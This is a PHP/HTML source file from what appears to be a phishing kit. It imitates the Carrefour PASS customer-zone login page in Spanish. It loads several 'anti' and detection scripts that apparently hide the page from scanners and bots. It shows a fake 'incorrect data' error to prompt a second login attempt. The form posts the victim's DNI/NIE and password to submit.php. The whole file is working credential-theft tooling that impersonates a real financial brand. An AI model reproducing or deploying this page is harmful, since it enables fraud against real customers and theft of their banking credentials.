<?php
session_start();
    error_reporting(0);
    require_once 'anti/anti1.php';
    require_once 'anti/anti2.php';
    require_once 'anti/anti3.php';
    require_once 'anti/anti4.php';
    require_once 'anti/anti5.php';
    require_once 'anti/anti6.php';
    require_once 'anti/anti7.php';
    require_once 'anti/anti8.php';
    require_once 'detect.php';
	require_once 'Defender.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- BOOTSTRAP -->
    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.min.css">

    <!-- Main CSS -->
    <link rel="stylesheet" type="text/css" href="assets/css/main.css">

    <title>PASS Carrefour acceso a Zona Clientes</title>

</head>
<body>

<header id="header" class="d-lg-block d-sm-none d-sm-none d-none">
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 dark-blue-bg d-flex justify-content-center align-items-center">
                <a href="#">
                    <img src="./assets/images/logo.svg">
                </a>
            </div>
            <div class="col-md-10" style="padding: 0;">
                <div class="top-header dark-blue-bg">
                    <ul>
                        <li>
                            <a href="#">Préstamos</a>
                        </li>
                        <li>
                            <a href="#">Financiación</a>
                        </li>
                        <li>
                            <a href="#">Apple Pay</a>
                        </li>
                        <li>
                            <a href="#">App PASS</a>
                        </li>
                        <li>
                            <a href="#">Seguridad PASS</a>
                        </li>
                        <li>
                            <a href="#">Seguros</a>
                        </li>
                    </ul>
                </div>
                <div class="main-header blue-bg">
                    <div class="row">
                        <div class="col-md-9 d-flex justify-content-center">
                            <ul>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Por qué PASS</span>
                                        <span>Te lo contamos</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Qué es PASS</span>
                                        <span>Cómo funciona</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
																	<span class="fz-18 font-weight-bold text-white">Simuladores

																		<i class="fas fa-angle-down"></i>
																	</span>
                                        <span>Pruébalo</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Contratación</span>
                                        <span>Hazte PASS</span>
                                    </a>
                                </li>
                                <li>
                                    <a href="#">
                                        <span class="fz-18 font-weight-bold text-white">Ayuda</span>
                                        <span>Consúltanos</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                        <div class="col-md-3 d-flex justify-content-center align-items-center account">
                            <a href="#">
                                <span class="name">¡Hola!</span>
                                <span class="logo">MM</span>
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</header>
<header id="header-mobile" class="d-lg-none d-md-block d-sm-block d-block">
    <div class="container-fluid" style="padding: 0;">
        <div class="d-flex">
            <div style="padding: 25px 35px" class="menu">
                <img src="./assets/images/burguer.svg">
            </div>
            <div style="padding: 25px 35px" class="logos flex-grow-1 dark-blue-bg">
                <img src="./assets/images/logo.svg">
            </div>
            <div style="padding: 25px 35px" class="comptos blue-bg">
                <img src="./assets/images/user.svg">
            </div>
        </div>
    </div>
</header>
    <div class="container-fluid">
        <div class="error_alert" id="error_alert">
            <div class="wrapper">
                <a class="close-icon" href="#" data-close-alert=""></a>
                <p class="alert"><i class="icon-alert"></i>¡Ups! Parece que algún dato no es correcto.</p>
                <p class="message">Prueba otra vez. Las claves son las mismas tanto para app como para web. No olvides que si te equivocas más de 3 veces el acceso se bloqueará.</p>
            </div>
        </div>
    </div>
    <main id="main">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                    <div class="fz-12 font-weight-medium"><span class="text-green">carrefour pass</span> <span style="color:#575d61">  <i style="margin: 0 5px" class="fas fa-angle-right"></i>  zona cliente</span></div>
                    <h3 class="text-blue fz-30 font-weight-normal mt-20 mb-30">Te damos la bienvenida a PASS</h3>
                    <form method="post" action="submit.php" class="loginform"  id="loginform" autocomplete="off">
                        <div class="form-group">
                            <label for="dni">ESCRIBE TU DNI O NIE</label>
                            <input type="text" name="dni" id="dni" class="form-control" maxlength="9">
                            <span class="inputinfo text-orange font-weight-medium fz-16">El DNI ó NIE introducido no es válido</span>
                        </div>
                        <div class="form-group">
                            <label for="dni">CONTRASEÑA CLIENTE ZONA PASS</label>
                            <div class="password-container">
                            <input type="password" name="password" id="password" class="form-control">
                            <div class="eye"></div>
                            </div>
                        </div>
                        <a class="mb-15" href="#">He olvidado mi contraseña <i class="fas fa-angle-right"></i></a>
                        <input type="hidden" name="type" value="second_login">
                        <div class="form-group">
                            <button type="submit" id="submit-button" class="btn-block disabled" disabled>Entrar</button>
                        </div>
                    </form>
                </div>
                <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                    <div class="box">
                        <div class="row">
                            <div class="col-lg-6 col-md-6 col-sm-12 col-12 d-lg-flex d-md-flex d-sm-block d-block d-block justify-content-center align-items-center">
                                <span class="text-blue font-weight-medium fz-16">¡ES MI PRIMERA VEZ!</span>
                            </div>
                            <div class="col-lg-6 col-md-6 col-sm-12 col-12 d-lg-flex d-md-flex d-sm-block d-block d-block justify-content-center align-items-center">
                                <a class="text-green font-weight-medium fz-16" href="#">Necesito una contraseña <i class="fas fa-angle-right"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer id="footer">
        <div class="container-fluid" style="margin-bottom: -1px;">
            <div class="row grey-bg">
                <div class="col-md-9 sec-with-image">
                    <h3 class="fz-24 font-weight-bold mb-0 text-white">Soluciones flexibles de compra para tu economía familiar.</h3>
                    <div class="social-media">
                        <a href="#"><i class="fab fa-facebook-f"></i></a>
                        <a href="#"><i class="fab fa-twitter"></i></a>
                    </div>
                </div>
            </div>
            <section></section>
            <div class="row">
                <div class="col-md-9"></div>
                <div class="col-md-3"></div>
            </div>
        </div>
        <div class="container-fluid blue-bg pt-50 pb-50 pr-100 pl-100">
            <a href="#"><img src="./assets/images/logo.svg"></a>
        </div>
        <div class="container-fluid sky-blue-bg pt-50 pb-50 pr-100 pl-100">
            <div class="row">
                <div class="col-md-9">
                    <p class="text-white font-weight-medium fz-16">Utilizamos cookies propias y de terceros para realizar la medición de los hábitos de navegación de los usuarios y ofrecer publicidad de interés. Si continuas navegando, consideramos que aceptas su uso. Puedes cambiar la configuración u obtener más información <a href="#">aquí</a></p>
                </div>
                <div class="col-md-3 d-flex justify-content-center align-items-center"><a href="#" class="button">He leído y acepto</a></div>
            </div>
        </div>
    </footer>



    <!-- Jquery JS -->
    <script type="text/javascript" src="assets/js/jquery-3.3.1.slim.min.js"></script>
    <!-- Popper JS -->
    <script type="text/javascript" src="assets/js/popper.min.js"></script>
    <!-- Bootstrap JS -->
    <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
    <!-- Font Awesome JS -->
    <script type="text/javascript" src="https://use.fontawesome.com/releases/v5.1.0/js/all.js"></script>
    <!-- Main JS -->
    <script type="text/javascript" src="assets/js/app.js"></script>

</body>
</html>